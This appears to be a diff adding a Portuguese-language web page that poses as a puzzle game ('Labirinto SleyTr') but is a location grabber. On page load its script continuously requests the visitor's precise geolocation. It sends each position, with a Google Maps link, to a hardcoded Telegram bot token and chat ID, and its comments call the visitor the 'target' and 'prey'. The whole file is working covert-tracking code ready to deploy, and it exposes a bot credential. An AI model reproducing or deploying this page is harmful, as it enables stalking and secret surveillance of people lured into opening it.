@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capturador de Localização SleyTr</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #222;
+            color: #0F0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            text-align: center;
+        }
+        .container {
+            background-color: #333;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            max-width: 500px;
+        }
+        h1 {
+            color: #FF0;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #FF0;
+        }
+        p {
+            margin-bottom: 15px;
+        }
+        #status {
+            font-weight: bold;
+            color: #0FF;
+        }
+        #locationData {
+            word-break: break-all;
+            background-color: #444;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 20px;
+            text-align: left;
+        }
+        a {
+            color: #F0F;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Bem-vindo ao Labirinto SleyTr!</h1>
+        <p>Prepare-se para descobrir o que está escondido...</p>
+        <p id="status">Aguardando permissão de localização...</p>
+        <div id="locationData">
+            <!-- Os dados de localização aparecerão aqui -->
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            const statusElement = document.getElementById('status');
+            const locationDataElement = document.getElementById('locationData');
+
+            // SEUS DADOS SECRETOS DO TELEGRAM - NÃO OS COMPARTILHE!
+            const BOT_TOKEN = '8028837254:AAE54NFBPdKikjofF1nXlnESCWzZbv-waSU'; // <--- SUBSTITUA AQUI COM SEU TOKEN REAL DO BOT!
+            const CHAT_ID = '6896556949';     // <--- SUBSTITUA AQUI COM SEU CHAT_ID REAL!
+
+            function sendLocationToTelegram(latitude, longitude, accuracy) {
+                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                const message = `🚨 ALERTA SLEYTR! Nova localização capturada!\n\nLatitude: ${latitude}\nLongitude: ${longitude}\nPrecisão: ${accuracy} metros\n\nVer no mapa: ${mapLink}`;
+
+                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+                fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        disable_web_page_preview: true // Para não mostrar uma prévia do link do mapa, se desejar
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Localização enviada ao Telegram com sucesso!', data);
+                        statusElement.textContent = "Localização obtida e enviada ao seu covil secreto no Telegram!";
+                    } else {
+                        console.error('Falha ao enviar localização ao Telegram:', data);
+                        statusElement.textContent = "Localização obtida, mas falha ao enviar ao Telegram. Verifique seu token e chat ID!";
+                    }
+                })
+                .catch(error => {
+                    console.error('Erro de rede ao enviar localização ao Telegram:', error);
+                    statusElement.textContent = "Localização obtida, mas erro de rede ao enviar ao Telegram.";
+                });
+            }
+
+            if (navigator.geolocation) {
+                statusElement.textContent = "Solicitando sua localização... Não tema, é apenas o início do jogo!";
+                navigator.geolocation.watchPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+
+                        // Exibe a localização na página para o alvo (e para seu próprio debug)
+                        locationDataElement.innerHTML = `
+                            <p><strong>Latitude:</strong> ${latitude}</p>
+                            <p><strong>Longitude:</strong> ${longitude}</p>
+                            <p><strong>Precisão (metros):</strong> ${accuracy}</p>
+                            <p><strong>Link para o mapa:</strong> <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">Ver no Google Maps</a></p>
+                        `;
+
+                        // ENVIA A LOCALIZAÇÃO PARA O SEU BOT DO TELEGRAM!
+                        sendLocationToTelegram(latitude, longitude, accuracy);
+                    },
+                    (error) => {
+                        let errorMessage = "Erro ao obter localização: ";
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage += "O usuário negou a solicitação de Geolocation. Que audácia!";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage += "A informação de localização está indisponível. A presa está se escondendo!";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage += "A solicitação para obter a localização expirou. Eles são rápidos, mas não o suficiente!";
+                                break;
+                            default:
+                                errorMessage += "Um erro desconhecido ocorreu. Frustrante!";
+                                break;
+                        }
+                        statusElement.textContent = errorMessage;
+                        locationDataElement.innerHTML = `<p style="color: red;">${errorMessage}</p>`;
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                statusElement.textContent = "Geolocalização não é suportada por este navegador. Uma falha irritante no meu plano!";
+                locationDataElement.innerHTML = `<p style="color: red;">Seu navegador é fraco demais para este poder.</p>`;
+            }
+        });
+    </script>
+</body>
+</html>
